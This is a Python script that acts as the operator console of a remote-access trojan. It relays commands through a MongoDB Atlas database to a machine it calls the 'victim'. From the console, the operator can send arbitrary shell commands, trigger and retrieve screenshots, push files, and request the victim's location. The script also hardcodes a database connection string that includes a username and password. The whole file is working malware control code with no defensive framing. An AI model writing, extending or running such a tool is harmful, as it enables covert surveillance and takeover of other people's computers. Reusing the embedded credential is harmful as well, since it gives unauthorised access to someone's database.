from io import BytesIO
import gridfs
from PIL import Image
from pymongo import MongoClient
from pymongo.server_api import ServerApi
from datetime import datetime

client = MongoClient("mongodb+srv://PaperCode:3aOqN02ZVrIvAaO3@kinetics.rtbhi4i.mongodb.net/?retryWrites=true&w"
                     "=majority", server_api=ServerApi('1'))

print(client.list_database_names())
command_base = client["command"]
data_base_contact = command_base["contact"]
data_base_img = command_base["img"]
data_base_cmd = command_base["cmd"]
data_base_EXE = command_base["exe"]
data_conn = command_base["conn"]
fs = gridfs.GridFS(command_base)


def CommandPromptTransmission():
    cmd = input("\tEnter Command: ")
    cmd_list = [{"attack_type": "cmd_use", "cmd": cmd}]
    data_base_cmd.insert_many(cmd_list)
    print("**cmd transmission sent**")


def SendImageTransmission():
    _attack_list = [{"_id": "attack", "attack_type": "info_retrieve", "info": "ss"}]
    data_base_img.insert_many(_attack_list)
    print("**screenshot transmission send**")


def SendFile():
    _n = input("\tEnter Message: ")
    print("**sending file ", _n, )
    _attack_list = [{"id": "attack", "attack_type": "info_update", "info": "file_c", "name": _n}]
    data_base_contact.insert_many(_attack_list)

def GetImageScreenShot():
    try:
        image_g = fs.get(file_id="ss")
        image_get = image_g.read()

        stream = BytesIO(image_get)

        image = Image.open(stream).convert("RGBA")
        stream.close()
        image.show()
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        image.save(current_time)
    except:
        print("**No screenshot present**")


def SendLocation():
    data = [{"info": "location"}]
    data_base_cmd.insert_many(data)
    print("**data_send**")


def GetLocation():
    if data_base_cmd.count_documents({"info_r": "location"}, limit=1) != 0:
        data = data_base_cmd.find({}, {'info_r': 'location', 'loc': 1})
        for _data in data:
            print("**", _data['loc'])
        data_base_cmd.delete_one({'info_r': 'location'})


if __name__ == '__main__':

    while True:
        if data_conn.count_documents({"_id": "connect"}, limit=1) != 0:
            print("Connected with victim")
            break
        else:
            pass

    while True:
        _att = input("--> ")
        if "take_img" in _att:
            SendImageTransmission()
        elif "get_img" in _att:
            GetImageScreenShot()
        elif "-c file" in _att:
            SendFile()
        elif "-a cmd" in _att:
            CommandPromptTransmission()
        elif "sent_loc_cmd" in _att:
            SendLocation()
        elif "get_loc" in _att:
            GetLocation()

